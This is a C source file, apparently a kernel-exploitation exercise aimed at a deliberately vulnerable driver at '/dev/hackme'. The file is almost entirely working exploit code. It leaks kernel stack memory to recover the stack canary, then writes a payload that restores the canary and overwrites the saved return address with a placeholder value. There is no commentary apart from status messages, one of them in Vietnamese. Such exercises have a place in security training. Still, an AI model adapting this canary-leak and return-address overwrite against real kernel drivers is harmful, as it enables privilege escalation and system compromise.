#include <fcntl.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char *VULN_DRV = "/dev/hackme";

int64_t global_fd;
uint64_t cookie;
uint8_t cookie_off = 16;

void open_module() {
  global_fd = open(VULN_DRV, O_RDWR);
  if (global_fd < 0) {
    printf("that bai ddkhi open %s\n", VULN_DRV);
    exit(-1);
  } else {
    printf("[+] successfully opened %s\n", VULN_DRV);
  }
}

void leak_cookie_canary() {
  uint8_t size = 40;
  uint64_t leak[size];
  printf("[*] trying to leak up to %ld bytes memory\n", sizeof(leak));
  uint64_t data = read(global_fd, leak, sizeof(leak));
  cookie = leak[cookie_off];
  for (int i = 0; i < size; i++) {
    printf("\nleak[%d]: 0x%lx", i, leak[i]);
  }
  printf("\nfound stack canary: 0x%lx @ index %d\n", cookie, cookie_off);
}

void write_rip() {
  uint8_t sz = 50;
  uint64_t payload[sz];
  payload[cookie_off++] = cookie;
  payload[cookie_off++] = 0;
  payload[cookie_off++] = 0;
  payload[cookie_off++] = 0;
  payload[cookie_off++] = 0xdeadbeefcafebabe;

  uint64_t data = write(global_fd, payload, sizeof(payload));
  if (data < 0) {
    printf("write fail T_T\n");
    exit(-1);
  } else {
    printf("write successfully\n");
  }
}

int main() {
  open_module();
  leak_cookie_canary();
  write_rip();
  return 0;
}
